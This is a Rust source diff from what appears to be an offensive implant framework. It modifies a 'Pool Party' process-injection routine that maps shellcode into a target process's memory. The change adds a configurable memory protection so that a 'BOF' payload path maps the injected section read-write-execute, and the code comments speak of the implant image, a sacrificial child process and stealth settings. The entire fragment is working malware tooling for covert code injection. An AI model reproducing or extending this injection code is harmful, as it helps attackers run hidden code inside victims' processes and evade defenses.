@@ -342,7 +342,13 @@ pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(),
     let (section_h, section_size) = pool_party_create_section(create_section, shellcode)?;
     let local_base = pool_party_map_local(map_view, section_h, section_size)?;
     pool_party_write_local(local_base, shellcode);
-    let target_base = match pool_party_map_target(map_view, section_h, target_h, section_size) {
+    let target_base = match pool_party_map_target(
+        map_view,
+        section_h,
+        target_h,
+        section_size,
+        crate::stealth::desired_final_protect(),
+    ) {
         Ok(b) => b,
         Err(e) => {
             // Unmap local before bailing.
@@ -473,11 +479,19 @@ unsafe fn pool_party_write_local(local_base: *mut c_void, shellcode: &[u8]) {
 
 /// Map the section into the target process (reader view). The caller unmaps
 /// the local view on failure.
+///
+/// `view_protect` is the target-process mapping protection. Pool Party
+/// shellcode uses RX (`desired_final_protect`). Isolated BOF maps the same
+/// section as RWX: the sacrificial child runs `bof-host` from this view *and*
+/// the appended payload sits in the same mapping; RX made the child AV
+/// (`0xC0000005`) on Windows CI. That RWX is bounded to the short-lived BOF
+/// worker, not the implant image.
 unsafe fn pool_party_map_target(
     map_view: NtMapViewOfSectionFn,
     section_h: *mut c_void,
     target_h: *mut c_void,
     section_size: i64,
+    view_protect: u32,
 ) -> Result<*mut c_void, String> {
     // ---- 5. Map the section into the target process ----
     let mut target_base: *mut c_void = core::ptr::null_mut();
@@ -493,7 +507,7 @@ unsafe fn pool_party_map_target(
             core::ptr::addr_of_mut!(target_size),
             1,
             0,
-            crate::stealth::desired_final_protect(), // PAGE_EXECUTE_READ — never RWX
+            view_protect,
         )
     };
     if st < 0 {
@@ -528,7 +542,16 @@ pub(crate) unsafe fn section_deliver(target_h: *mut c_void, bytes: &[u8]) -> Res
         }
     };
     unsafe { pool_party_write_local(local_base, bytes) };
-    let target_base = match pool_party_map_target(map_view, section_h, target_h, section_size) {
+    // Isolated BOF: same section holds PIC host + appended payload. The child
+    // executes AND writes the tail; RX (Pool Party shellcode policy) AV'd.
+    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+    let target_base = match pool_party_map_target(
+        map_view,
+        section_h,
+        target_h,
+        section_size,
+        PAGE_EXECUTE_READWRITE,
+    ) {
         Ok(b) => b,
         Err(e) => {
             unsafe { unmap_view(CUR_PROCESS, local_base) };
